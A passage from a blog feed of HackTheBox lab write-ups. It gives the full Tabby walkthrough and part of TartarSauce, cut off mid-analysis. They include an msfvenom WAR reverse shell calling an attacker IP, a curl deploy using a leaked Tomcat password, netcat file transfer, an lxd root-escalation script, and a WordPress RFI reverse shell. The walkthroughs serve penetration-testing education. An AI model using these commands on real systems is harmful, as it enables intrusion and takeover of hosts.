<p><img src="/assets/Traverxec/exploit-rewritten.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Easy] - Tabby</title><link href="http://localhost:4000/2022/08/24/Tabby.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Tabby" /><published>2022-08-24T00:00:00+02:00</published><updated>2022-08-24T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/24/Tabby</id><content type="html" xml:base="http://localhost:4000/2022/08/24/Tabby.html"><![CDATA[<p><img src="/assets/Tabby/Tabby.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Tabby</strong> is a <strong>linux</strong> machine hosting both <strong>Apache web server</strong> and <strong>Tomcat</strong>.</li>
  <li>The website on port 80 had a <strong>Directory Traversal vulnerability</strong> which enabled us to <strong>read a Tomcat configuration file</strong> which <strong>contained valid credentials.</strong></li>
  <li><em>Using those,</em> we <strong>get a user with enough privileges to upload a WAR file containing a reverse shell</strong>. <em>And, with it</em>, we <strong>access the box</strong> as the <code class="language-plaintext highlighter-rouge">tomcat</code> user.</li>
  <li>We find an <strong>encrypted backup archive in the webroot</strong>. We <strong>crack it</strong> with <code class="language-plaintext highlighter-rouge">john</code> to <strong>get a password.</strong></li>
  <li>The password was <em>being reused</em> by another user on the box (<code class="language-plaintext highlighter-rouge">ash</code>) who happened to be <strong>a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group.</strong></li>
  <li>We <strong>escalate our privileges</strong> to <code class="language-plaintext highlighter-rouge">root</code> by <strong>creating a specially-configured container</strong>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us areas to check:</p>
<ul>
  <li>the <strong>website on port 80</strong></li>
  <li>and the <strong>Tomcat instance on port 8080</strong></li>
  <li><strong>SSH</strong> would come in handy if we get any creds</li>
</ul>

<h2 id="port-80">Port 80</h2>
<p>The home page here was mostly <strong>static content</strong>.</p>

<p><img src="/assets/Tabby/homepage-port-80.jpg" alt="" /></p>

<p><em>except for</em> the <strong>link for the “News” page.</strong></p>

<p>note: <em>on the link below</em>, notice <em>how the host name changed</em> to <strong>“megahosting.htb”</strong></p>

<p><img src="/assets/Tabby/virtual-host-routing.jpg" alt="" /></p>

<p>an entry in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> will take care of this <strong>Virtual Host Routing</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.194 megahosting.htb
</code></pre></div></div>

<p>we also notice that <code class="language-plaintext highlighter-rouge">news.php</code> handles <strong>a parameter</strong> called <code class="language-plaintext highlighter-rouge">file</code>. this looks like a <strong>file inclusion vulnerability.</strong></p>

<p><img src="/assets/Tabby/lfi-spotted.jpg" alt="" /></p>

<p>trying <code class="language-plaintext highlighter-rouge">/etc/passwd</code> in the parameter doesn’t work.</p>

<p>but going <strong>4 directories back</strong> with <code class="language-plaintext highlighter-rouge">../../../../</code> gets us the <strong>confirmation</strong> we need.</p>

<p><img src="/assets/Tabby/lfi-confirmed.jpg" alt="" /></p>

<p><em>after a couple of tries to get the path right,</em> we are able to <strong>get the source code</strong> of the <code class="language-plaintext highlighter-rouge">news.php</code> file:</p>

<p><img src="/assets/Tabby/news-php-src-code.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">fopen</code> function here makes this a <strong>Directory/Path Traversal vulnerability</strong> and <strong>not a Local File Inclusion.</strong></p>

<p>that’s because <code class="language-plaintext highlighter-rouge">fopen</code> just <strong>reads a file’s contents</strong>. it <strong>doesn’t evaluate PHP code</strong> like <code class="language-plaintext highlighter-rouge">include</code> or <code class="language-plaintext highlighter-rouge">require</code></p>

<p><strong><em>Knowing this bit spares us the effort of trying to get code execution by including PHP.</em></strong></p>

<h2 id="reading-sensitive-files">Reading Sensitive Files</h2>
<p><em>As a quick check,</em> we try to read the <code class="language-plaintext highlighter-rouge">ash</code> user’s <strong>private SSH key</strong> (<code class="language-plaintext highlighter-rouge">/home/ash/.ssh/id_rsa</code>). But it’s <em>not that easy</em> :)</p>

<p>We then think “maybe we should take a look at tomcat before diving any deeper here”. Just in case..</p>

<p><img src="/assets/Tabby/tomcat-homepage.jpg" alt="" /></p>

<p>We get some <strong>decent information</strong> from this page. the <strong>webroot</strong> and <strong>where Tomcat is installed.</strong></p>

<p><em>But, when it comes to sensitive files,</em> there’s <strong>a very important one</strong> called <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code>. it’s in <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/</code> by default.</p>

<p>We found it there and got <strong>creds for a user</strong> with <strong>very nice privileges</strong> :]</p>

<p><img src="/assets/Tabby/reading-tomcat-users-xml.jpg" alt="" /></p>

<h2 id="exploiting-our-tomcat-privileges-for-rce">Exploiting our Tomcat Privileges for RCE</h2>
<p>The <code class="language-plaintext highlighter-rouge">manager-script</code> role has access to <strong>upload WAR files.</strong></p>

<p>to abuse this, we will generate a <strong>WAR reverse shell</strong> with <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.3 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> revvy.war
</code></pre></div></div>

<p><img src="/assets/Tabby/creating-a-war-file.jpg" alt="" /></p>

<p>then <strong>upload the WAR file</strong> using <code class="language-plaintext highlighter-rouge">curl</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> tomcat:<span class="s1">'$3cureP4s5w0rd123!'</span> <span class="nt">-T</span> revvy.war <span class="s2">"http://tabby:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
</code></pre></div></div>

<p>start up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on port 9000</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9000
</code></pre></div></div>

<p>and <code class="language-plaintext highlighter-rouge">curl</code> the endpoint to hit and trigger our reverse shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://tabby:8080/shell
</code></pre></div></div>

<p><img src="/assets/Tabby/shell-as-tomcat.jpg" alt="" /></p>

<p>we’re in as <code class="language-plaintext highlighter-rouge">tomcat</code> :)</p>

<h2 id="pivoting-via-password-reuse">Pivoting via Password Reuse</h2>

<p><em>Right after improving our shell,</em> we start with <strong>checking the files</strong> in <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>

<p>there was a folder called <code class="language-plaintext highlighter-rouge">files</code>. It contained a <strong>password-protected zip archive</strong> that was <strong>owned by</strong> the <code class="language-plaintext highlighter-rouge">ash</code> user.</p>

<p><img src="/assets/Tabby/finding-ashes-zip-file.jpg" alt="" /></p>

<p>we <strong>transfer it over</strong> to our kali using <code class="language-plaintext highlighter-rouge">netcat</code> so we can <strong>crack</strong> it</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># on tabby</span>
nc <span class="nt">-lvnp</span> 5000 &lt; 16162020_backup.zip
<span class="c"># on our kali</span>
nc tabby 5000 <span class="o">&gt;</span> ash_backup.zip
</code></pre></div></div>

<p><em>and, to verify that the file wasn’t corrupted in-transit,</em> we do a quick <strong>integrity check</strong> using <code class="language-plaintext highlighter-rouge">md5sum</code>.</p>

<p><img src="/assets/Tabby/transferring-zip-file.jpg" alt="" /></p>

<p>we use <code class="language-plaintext highlighter-rouge">zip2john</code> to <strong>get a hash</strong> for <code class="language-plaintext highlighter-rouge">john</code> to crack.</p>

<p><img src="/assets/Tabby/zip-password.jpg" alt="" /></p>

<p>it successfully cracked. but we <em>didn’t find anything important</em> within the archive itself.</p>

<p><img src="/assets/Tabby/zip-files.jpg" alt="" /></p>

<p>the files were practically <strong><em>the same as the original ones.</em></strong></p>

<p><em>But, since we now had a password,</em> we tried it against <code class="language-plaintext highlighter-rouge">ash</code> and <code class="language-plaintext highlighter-rouge">root</code></p>

<p>it didn’t work with <code class="language-plaintext highlighter-rouge">root</code>, but <strong>did</strong> with <code class="language-plaintext highlighter-rouge">ash</code> :)</p>

<p><img src="/assets/Tabby/logged-in-as-ash.jpg" alt="" /></p>

<h2 id="lxd-privilege-escalation">LXD Privilege Escalation</h2>
<p><em>As you may have noticed from the previous image,</em> <code class="language-plaintext highlighter-rouge">ash</code> is part of the <code class="language-plaintext highlighter-rouge">lxd</code> group</p>

<p><img src="/assets/Tabby/lxd-group-membership.jpg" alt="" /></p>

<p>this is <em>almost exactly the same situation</em> as in the <a href="https://omnisl4sh.github.io/2022/08/17/Brainfuck.html#lxd-privilege-escalation">Brainfuck Privesc</a>.</p>

<p>one <em>minor difference</em> is that <strong>we have to initialize the LX daemon</strong> with <code class="language-plaintext highlighter-rouge">lxd init</code> before importing the image.</p>

<p>note: also make sure to add <code class="language-plaintext highlighter-rouge">/snap/bin</code> to the <code class="language-plaintext highlighter-rouge">PATH</code> environment variable as <em>it’s not there by default.</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/snap/bin/
</code></pre></div></div>

<p><img src="/assets/Tabby/lxd-init.jpg" alt="" /></p>

<p><em>for a bit of automation,</em> we’re going to throw the commands into a <strong>bash script</strong>. here are the contents:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
lxc image import alpine-small-image.tar.gz <span class="nt">--alias</span> myimage
lxc image list
lxc init myimage mycontainer <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
</span>lxc config device add mycontainer mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
</span>lxc start mycontainer
lxc <span class="nb">exec </span>mycontainer /bin/sh
</code></pre></div></div>

<p><em>after getting the container root shell,</em> we add an <strong>SUID bit</strong> to the host’s <strong>bash shell</strong> so we can run it as <code class="language-plaintext highlighter-rouge">root</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +s /mnt/root/bin/bash
</code></pre></div></div>

<p><img src="/assets/Tabby/lxc-root-bash-script.jpg" alt="" /></p>

<h2 id="cleaning-up">Cleaning Up</h2>

<p><em>To clear away remnants,</em> we have to <strong>stop the container</strong> and <strong>delete it</strong> along with <strong>the image we imported.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc stop mycontainer
lxc delete mycontainer
lxc image delete myimage
</code></pre></div></div>

<p><img src="/assets/Tabby/lxc-cleanup.jpg" alt="" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Medium] - TartarSauce</title><link href="http://localhost:4000/2022/08/21/TartarSauce.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - TartarSauce" /><published>2022-08-21T00:00:00+02:00</published><updated>2022-08-21T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/21/TartarSauce</id><content type="html" xml:base="http://localhost:4000/2022/08/21/TartarSauce.html"><![CDATA[<p><img src="/assets/TartarSauce/TartarSauce.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>TartarSauce</strong> is a <strong>Linux</strong> machine where <em>only port 80 was open.</em></li>
  <li><em>On the webroot</em>, the <code class="language-plaintext highlighter-rouge">robots.txt</code> file had entries for a <strong>CMS</strong> called <strong>“Monstra”</strong> where we could log on using <strong>weak credentials.</strong></li>
  <li><em>Even though the</em> <strong><em>CMS had plenty of exploitable functionalities</em></strong>, we <strong>couldn’t exploit</strong> any <strong>due to the restrictions in place</strong>. so we looked elsewhere.</li>
  <li><em>After we do some</em> <strong><em>web directory brute forcing</em></strong>, we discover a <strong>WordPress instance</strong> that had a <strong>plugin vulnerable to RFI</strong>.</li>
  <li>We <strong>successfully exploit the vulnerability</strong> and get <strong>Remote Code Execution</strong> as <code class="language-plaintext highlighter-rouge">www-data</code>.</li>
  <li>We find that we have a <code class="language-plaintext highlighter-rouge">sudo</code> <strong>privilege</strong> to <strong>run</strong> the <code class="language-plaintext highlighter-rouge">tar</code> command as the <code class="language-plaintext highlighter-rouge">onuma</code> user. We <strong>exploit that</strong> and get a shell.</li>
  <li>Running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> for <strong>privilege escalation</strong> shows us a <strong>system timer</strong> that <strong>runs a script</strong> (<code class="language-plaintext highlighter-rouge">backuperer</code>) every 5 minutes.</li>
  <li><em>Since that script ran as</em> <code class="language-plaintext highlighter-rouge">root</code>, we analyzed it to find that it <strong>extracts an archive that we can control</strong> <em>during execution.</em></li>
  <li><em>By inserting an</em> <strong>SUID shell</strong> <em>into a</em> <strong>tar archive</strong> <em>of our own</em>, and then <strong><em>replacing the initial archive with it</em></strong>. We take advantage of the script <strong>extracting our SUID shell</strong> and <strong><em>becoming its owner in the process</em></strong>. Thus <strong>giving us a root shell ;]</strong></li>
</ul>

<p><strong><em>That last part unclear? don’t worry. it gets its fair share of breakdown <a href="#detecting-system-operations">below</a> :)</em></strong></p>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page
|_http-server-header: Apache/2.4.18 (Ubuntu)
</code></pre></div></div>

<p><em>Starting with</em> <strong>nmap</strong>, it gave it to us straight… only <strong>port 80</strong> here :D</p>

<p>The home page shows <em>nothing special</em>. Just a <strong>Text Art</strong> bottle of <strong>Tartar Sauce.</strong></p>

<p><img src="/assets/TartarSauce/home-page-tartar-sauce.jpg" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">robots.txt</code> shows us <strong>a few urls to try</strong>. So we create a small list and feed it to <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<p><img src="/assets/TartarSauce/curling-robots-txt.jpg" alt="" /></p>

<p>Only <code class="language-plaintext highlighter-rouge">http://tartarsauce/webservices/monstra-3.0.4/</code> was valid. So we check it out.</p>

<h2 id="the-monstra-cms">The Monstra CMS</h2>

<p>Here’s what the home page looked like:</p>

<p><img src="/assets/TartarSauce/monstra-homepage.jpg" alt="" /></p>

<p>most links on it led to a <code class="language-plaintext highlighter-rouge">404 - Not Found</code> <em>except for the</em> <strong>login form</strong>:</p>

<p><img src="/assets/TartarSauce/monstra-login-page.jpg" alt="" /></p>

<p>we could log in with <code class="language-plaintext highlighter-rouge">admin:admin</code></p>

<p><img src="/assets/TartarSauce/monstra-logged-in.jpg" alt="" /></p>

<p><em>however,</em> we <strong>couldn’t abuse any functionalities</strong> to get <strong>RCE</strong>.</p>

<p><strong>Check #1:</strong> <strong>Uploading a reverse shell</strong> failed.</p>

<p><img src="/assets/TartarSauce/monstra-file-upload-fail.jpg" alt="" /></p>

<p><strong>Check #2:</strong> <strong>Installing a malicious plugin..</strong> the same.</p>

<p><img src="/assets/TartarSauce/monstra-install-plugin-fail.jpg" alt="" /></p>

<p><strong>Check #3:</strong> <strong>Editing themes to insert PHP…</strong> no dice :/</p>

<p><img src="/assets/TartarSauce/monstra-editing-themese.jpg" alt="" /></p>

<p><img src="/assets/TartarSauce/monstra-editing-themes-2.jpg" alt="" /></p>

<p><em>After</em> <strong><em>all the exploits on ExploitDB failed,</em></strong> we decided <strong>Monstra was relatively secure</strong> and it was <strong><em>time to look elsewhere :D</em></strong></p>

<p><img src="/assets/TartarSauce/monstra-exploit-db-fail.jpg" alt="" /></p>

<h2 id="finding-a-wordpress-instance">Finding a Wordpress Instance</h2>

<p><em>After running another quick</em> <code class="language-plaintext highlighter-rouge">gobuster</code>, we found <strong><em>another web directory:</em></strong> <code class="language-plaintext highlighter-rouge">wp</code></p>

<p><img src="/assets/TartarSauce/finding-wordpress.jpg" alt="" /></p>

<p>it contained a <strong>Wordpress</strong> blog</p>

<p><img src="/assets/TartarSauce/wordpress-homepage.jpg" alt="" /></p>

<p><em>Naturally,</em> we run <code class="language-plaintext highlighter-rouge">wpscan</code> to enumerate <code class="language-plaintext highlighter-rouge">-e</code>:</p>
<ul>
  <li>All <strong>plugins</strong> <code class="language-plaintext highlighter-rouge">ap</code></li>
  <li>All <strong>themes</strong> <code class="language-plaintext highlighter-rouge">at</code></li>
  <li><strong>Timthumbs</strong> <code class="language-plaintext highlighter-rouge">tt</code></li>
  <li><strong>Config backups</strong> <code class="language-plaintext highlighter-rouge">cb</code></li>
  <li><strong>Database exports</strong> <code class="language-plaintext highlighter-rouge">dbe</code></li>
  <li>And <strong>Users</strong> <code class="language-plaintext highlighter-rouge">u</code></li>
</ul>

<p><strong>Important to note:</strong> adding the <code class="language-plaintext highlighter-rouge">--plugins-detection</code> flag with the <code class="language-plaintext highlighter-rouge">aggressive</code> mode is <strong>key</strong> in this step.</p>

<p>That’s because the recent versions of <code class="language-plaintext highlighter-rouge">wpscan</code> -<em>by default</em>- use the -<em>too polite and gentle</em>- <code class="language-plaintext highlighter-rouge">passive</code> mode which <strong>won’t detect any plugins</strong> and thus <strong>block the main exploitation path</strong>.</p>

<p>That part took me a while to figure out *<strong><em>smiles in pain</em></strong>*.</p>

<p>Here’s the command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://tartarsauce/webservices/wp/ <span class="nt">-e</span> ap,at,tt,cb,dbe,u <span class="nt">--plugins-detection</span> aggressive <span class="nt">-t</span> 50
</code></pre></div></div>

<p>The output showed <strong>a total of 3 plugins:</strong></p>

<p><img src="/assets/TartarSauce/wordpress-plugins.jpg" alt="" /></p>

<p><em>After searching,</em> the <code class="language-plaintext highlighter-rouge">Gwolle Guestbook</code> plugin turned out to have <strong>a Remote File Inclusion vulnerability</strong> on the URL highlighted below:</p>

<p><img src="/assets/TartarSauce/wordpress-vuln-plugin.jpg" alt="" /></p>

<p><em>Following the exploit steps,</em> we:</p>
<ol>
  <li><strong>Copy our favourite PHP reverse shell</strong> <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code> to <code class="language-plaintext highlighter-rouge">rev.txt</code></li>
  <li><strong>Modify</strong> the <code class="language-plaintext highlighter-rouge">ip</code> and <code class="language-plaintext highlighter-rouge">port</code> variables</li>
  <li><strong>Serve it</strong> on a <code class="language-plaintext highlighter-rouge">python</code> webserver</li>
  <li>Start a <code class="language-plaintext highlighter-rouge">netcat</code> listener to <strong>catch the connect back</strong></li>
  <li><code class="language-plaintext highlighter-rouge">curl</code> the <strong>vulnerable endpoint</strong> while placing a question mark <code class="language-plaintext highlighter-rouge">?</code> at the end. (This is because the plugin appends <code class="language-plaintext highlighter-rouge">wp-load.php</code> to the request. So we use the <code class="language-plaintext highlighter-rouge">?</code> to break off the url at that point)</li>
</ol>

<p><img src="/assets/TartarSauce/RFI-2-shell.jpg" alt="" /></p>

<p>Sweet :D</p>

<h2 id="pivoting-to-onuma">Pivoting to Onuma</h2>
<p><em>After</em> <strong><em>optimizing our shell,</em></strong> we get to work.</p>

<p><img src="/assets/TartarSauce/shell-pimping.jpg" alt="" /></p>

<p><em>when we type</em> <code class="language-plaintext highlighter-rouge">sudo -l</code> <em>to check our</em> <strong>sudo privileges</strong>, we find that we can run the <code class="language-plaintext highlighter-rouge">tar</code> command as the <code class="language-plaintext highlighter-rouge">onuma</code> user.</p>

<p><img src="/assets/TartarSauce/sudo-tar.jpg" alt="" /></p>

<p>A quick look on <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a> tells us that <strong>we can get a shell</strong> with that:</p>

<p><img src="/assets/TartarSauce/gtfobins-tar.jpg" alt="" /></p>

<p>It was legit. we’re now interacting as <code class="language-plaintext highlighter-rouge">onuma</code></p>

<p><img src="/assets/TartarSauce/shell-as-onuma.jpg" alt="" /></p>

<h2 id="detecting-system-operations">Detecting System Operations</h2>
<p><em>When running a quick</em> <a href="https://github.com/carlospolop/PEASS-ng">linpeas.sh</a>, we spot a <strong>unique system timer:</strong></p>

<p><img src="/assets/TartarSauce/system-timers.jpg" alt="" /></p>

<p>and <strong>other files</strong> that stick out</p>

<p><img src="/assets/TartarSauce/backup-files-modified.jpg" alt="" /></p>

<p>We do a quick <em>case-insensitive</em> <code class="language-plaintext highlighter-rouge">find</code> to search for <strong>everything that has the word “backup” in it.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-iname</span> <span class="s1">'*backup*'</span> 2&gt;/dev/null
</code></pre></div></div>

<p>there was a <code class="language-plaintext highlighter-rouge">bash</code> script called <code class="language-plaintext highlighter-rouge">backuperer</code> in <code class="language-plaintext highlighter-rouge">/usr/bin</code></p>

<p><img src="/assets/TartarSauce/finding-backuperer-script.jpg" alt="" /></p>

<p>the contents:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="c">#-------------------------------------------------------------------------------------</span>
<span class="c"># backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ</span>
<span class="c"># ONUMA Dev auto backup program</span>
<span class="c"># This tool will keep our webapp backed up incase another skiddie defaces us again.</span>
<span class="c"># We will be able to quickly restore from a backup in seconds ;P</span>
<span class="c">#-------------------------------------------------------------------------------------</span>

<span class="c"># Set Vars Here</span>
<span class="nv">basedir</span><span class="o">=</span>/var/www/html
<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp
<span class="nv">testmsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_test.txt
<span class="nv">errormsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_error.txt
<span class="nv">tmpfile</span><span class="o">=</span><span class="nv">$tmpdir</span>/.<span class="si">$(</span>/usr/bin/head <span class="nt">-c100</span> /dev/urandom |sha1sum|cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
<span class="nv">check</span><span class="o">=</span><span class="nv">$tmpdir</span>/check

<span class="c"># formatting</span>
printbdr<span class="o">()</span>
<span class="o">{</span>
    <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>72<span class="si">)</span><span class="p">;</span>
    <span class="k">do</span> /usr/bin/printf <span class="s2">$"-"</span><span class="p">;</span>
    <span class="k">done</span>
<span class="o">}</span>
<span class="nv">bdr</span><span class="o">=</span><span class="si">$(</span>printbdr<span class="si">)</span>

<span class="c"># Added a test file to let us see when the last backup was run</span>
/usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Auto backup backuperer backup last ran at : </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$testmsg</span>

<span class="c"># Cleanup from last time.</span>
/bin/rm <span class="nt">-rf</span> <span class="nv">$tmpdir</span>/.<span class="k">*</span> <span class="nv">$check</span>

<span class="c"># Backup onuma website dev files.</span>
/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;

<span class="c"># Added delay to wait for backup to complete if large files get added.</span>
/bin/sleep 30

<span class="c"># Test the backup integrity</span>
integrity_chk<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/diff <span class="nt">-r</span> <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
<span class="o">}</span>

/bin/mkdir <span class="nv">$check</span>
/bin/tar <span class="nt">-zxvf</span> <span class="nv">$tmpfile</span> <span class="nt">-C</span> <span class="nv">$check</span>
<span class="k">if</span> <span class="o">[[</span> <span class="si">$(</span>integrity_chk<span class="si">)</span> <span class="o">]]</span>
<span class="k">then</span>
    <span class="c"># Report errors so the dev can investigate the issue.</span>
    /usr/bin/printf <span class="s2">$"</span><span class="nv">$bdr</span><span class="se">\n</span><span class="s2">Integrity Check Error in backup last ran :  </span><span class="si">$(</span>/bin/date<span class="si">)</span><span class="se">\n</span><span class="nv">$bdr</span><span class="se">\n</span><span class="nv">$tmpfile</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    integrity_chk <span class="o">&gt;&gt;</span> <span class="nv">$errormsg</span>
    <span class="nb">exit </span>2
<span class="k">else</span>
    <span class="c"># Clean up and save archive to the bkpdir.</span>
    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
    /bin/rm <span class="nt">-rf</span> <span class="nv">$check</span> .<span class="k">*</span>
    <span class="nb">exit </span>0
<span class="k">fi</span>
</code></pre></div></div>
<p><em>removing the excess lines and comments,</em> it’s around <strong>30 lines of code</strong>. not too bad I guess :)</p>

<h2 id="breaking-down-backuperer">Breaking down “Backuperer”</h2>
<p>Let’s first <strong>break down all the variables</strong> for <strong>absolute paths</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set Vars Here</span>
<span class="nv">basedir</span><span class="o">=</span>/var/www/html
<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp

<span class="nv">testmsg</span><span class="o">=</span>/var/backups/onuma_backup_test.txt
<span class="nv">errormsg</span><span class="o">=</span>/var/backups/onuma_backup_error.txt

<span class="nv">tmpfile</span><span class="o">=</span>/var/tmp/.<span class="si">$(</span>/usr/bin/head <span class="nt">-c100</span> /dev/urandom |sha1sum|cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
<span class="nv">check</span><span class="o">=</span>/var/tmp/check
</code></pre></div></div>

<p>all self-explanatory except for the <code class="language-plaintext highlighter-rouge">tmpfile</code> variable, which is just a <code class="language-plaintext highlighter-rouge">SHA1</code> value</p>

<p>Here’s what we get when run that line on its own:</p>

<p><img src="/assets/TartarSauce/sha1sum.jpg" alt="" /></p>

<p>next, the <code class="language-plaintext highlighter-rouge">printbdr</code> function</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># formatting</span>
printbdr<span class="o">()</span>
<span class="o">{</span>
    <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>72<span class="si">)</span><span class="p">;</span>
    <span class="k">do</span> /usr/bin/printf <span class="s2">$"-"</span><span class="p">;</span>
    <span class="k">done</span>
<span class="o">}</span>
<span class="nv">bdr</span><span class="o">=</span><span class="si">$(</span>printbdr<span class="si">)</span>
</code></pre></div></div>

<p>it just <strong>creates a border</strong> for <strong>nice formatting</strong></p>

<p><img src="/assets/TartarSauce/bdr-function.jpg" alt="" /></p>

<p>then, the script:</p>
<ul>
  <li><strong>does some cleanup from older runs</strong></li>
  <li><strong>tars up</strong> the <code class="language-plaintext highlighter-rouge">basedir</code> (<code class="language-plaintext highlighter-rouge">/var/www/html</code>) into <code class="language-plaintext highlighter-rouge">tmpfile</code> (<code class="language-plaintext highlighter-rouge">/var/tmp/.&lt;SHA1SUM&gt;</code>)</li>
  <li>then <strong>sleeps for 30 seconds.</strong> <em>(This is in case the backup process takes longer than expected.)</em></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Cleanup from last time.</span>
/bin/rm <span class="nt">-rf</span> <span class="nv">$tmpdir</span>/.<span class="k">*</span> <span class="nv">$check</span>

<span class="c"># Backup onuma website dev files.</span>
/usr/bin/sudo <span class="nt">-u</span> onuma /bin/tar <span class="nt">-zcvf</span> <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> &amp;

<span class="c"># Added delay to wait for backup to complete if large files get added.</span>
/bin/sleep 30
</code></pre></div></div>

<p>The following is a <strong>function</strong> that does a <strong><em>recursive</em></strong> <code class="language-plaintext highlighter-rouge">diff</code> between <code class="language-plaintext highlighter-rouge">basedir</code> (<code class="language-plaintext highlighter-rouge">var/www/html</code>) and <code class="language-plaintext highlighter-rouge">check+basedir</code> (<code class="language-plaintext highlighter-rouge">/var/tmp/check/var/www/html</code>)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test the backup integrity</span>
